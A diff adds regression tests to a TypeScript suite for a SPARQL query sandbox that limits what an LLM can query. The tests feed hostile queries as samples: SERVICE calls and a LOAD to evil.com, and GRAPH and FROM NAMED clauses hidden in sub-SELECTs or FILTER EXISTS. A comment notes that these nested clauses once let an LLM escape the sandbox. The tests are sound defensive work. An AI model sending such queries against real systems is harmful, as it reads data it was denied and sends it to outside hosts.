@@ -133,6 +133,43 @@ describe('enforceSparqlPolicy', () => {
     // Re-register for remaining tests
     registerPolicyNamespaces(['https://w3id.org/ascs-ev/envited-x/'])
   })
+
+  it('rejects a SERVICE buried inside a sub-SELECT', () => {
+    const q = `
+      PREFIX hdmap: <https://w3id.org/ascs-ev/envited-x/hdmap/v6/>
+      SELECT ?x WHERE {
+        { SELECT ?x WHERE { SERVICE <https://evil.com/sparql> { ?x a hdmap:HdMap } } }
+      }
+    `
+    const result = enforceSparqlPolicy(q)
+    expect(result.allowed).toBe(false)
+    expect(result.violations.join(' ')).toContain('SERVICE')
+  })
+
+  it('rejects FROM dataset clauses (graph redirection)', () => {
+    const q = `
+      PREFIX hdmap: <https://w3id.org/ascs-ev/envited-x/hdmap/v6/>
+      SELECT ?x FROM <urn:graph:schema> WHERE { ?x a hdmap:HdMap }
+    `
+    const result = enforceSparqlPolicy(q)
+    expect(result.allowed).toBe(false)
+    expect(result.violations.join(' ')).toContain('FROM')
+  })
+
+  it('rejects LOAD operations', () => {
+    const result = enforceSparqlPolicy('LOAD <https://evil.com/data.ttl>')
+    expect(result.allowed).toBe(false)
+    expect(result.violations[0]).toMatch(/Only SELECT|Parse error/)
+  })
+
+  it('appends LIMIT on a fresh line even when the query ends in a comment', () => {
+    // Comment-injection guard: a trailing `#` comment must not swallow the
+    // auto-appended LIMIT (the policy appends it on a new line, post-parse).
+    const q = validSelect.trimEnd() + '\n# trailing comment without a newline'
+    const result = enforceSparqlPolicy(q)
+    expect(result.allowed).toBe(true)
+    expect(result.query).toMatch(/\nLIMIT 500\s*$/)
+  })
 })
 
 describe('validateSchemaQuery', () => {
@@ -233,5 +270,46 @@ describe('validateSchemaQuery', () => {
     expect(result.allowed).toBe(true)
     expect(result.query).toContain('LIMIT 50')
     expect(result.query).not.toContain('999')
+  })
+
+  // ── Sub-SELECT / EXISTS sandbox-escape regressions ──────────────────────
+  // Before the full-AST walk, SERVICE/GRAPH nested in a sub-SELECT or a
+  // FILTER EXISTS slipped past the two-key recursion and was wrongly allowed,
+  // letting an LLM read other named graphs and federate to external endpoints.
+
+  it('rejects a SERVICE hidden in a sub-SELECT', () => {
+    const result = validateSchemaQuery(
+      'SELECT * WHERE { { SELECT ?s WHERE { SERVICE <http://evil.com/sparql> { ?s ?p ?o } } } }',
+      schemaGraph
+    )
+    expect(result.allowed).toBe(false)
+    expect(result.violations.join(' ')).toContain('SERVICE')
+  })
+
+  it('rejects a GRAPH hidden in a sub-SELECT', () => {
+    const result = validateSchemaQuery(
+      'SELECT * WHERE { { SELECT ?x WHERE { GRAPH <urn:graph:other> { ?x ?p ?o } } } }',
+      schemaGraph
+    )
+    expect(result.allowed).toBe(false)
+    expect(result.violations.join(' ')).toContain('GRAPH')
+  })
+
+  it('rejects a GRAPH hidden inside FILTER EXISTS', () => {
+    const result = validateSchemaQuery(
+      'SELECT * WHERE { ?s ?p ?o . FILTER EXISTS { GRAPH <urn:graph:other> { ?s ?p2 ?o2 } } }',
+      schemaGraph
+    )
+    expect(result.allowed).toBe(false)
+    expect(result.violations.join(' ')).toContain('GRAPH')
+  })
+
+  it('rejects FROM NAMED hidden in a sub-SELECT', () => {
+    const result = validateSchemaQuery(
+      'SELECT * WHERE { { SELECT ?s FROM NAMED <urn:graph:other> WHERE { ?s ?p ?o } } }',
+      schemaGraph
+    )
+    expect(result.allowed).toBe(false)
+    expect(result.violations.join(' ')).toContain('FROM')
   })
 })
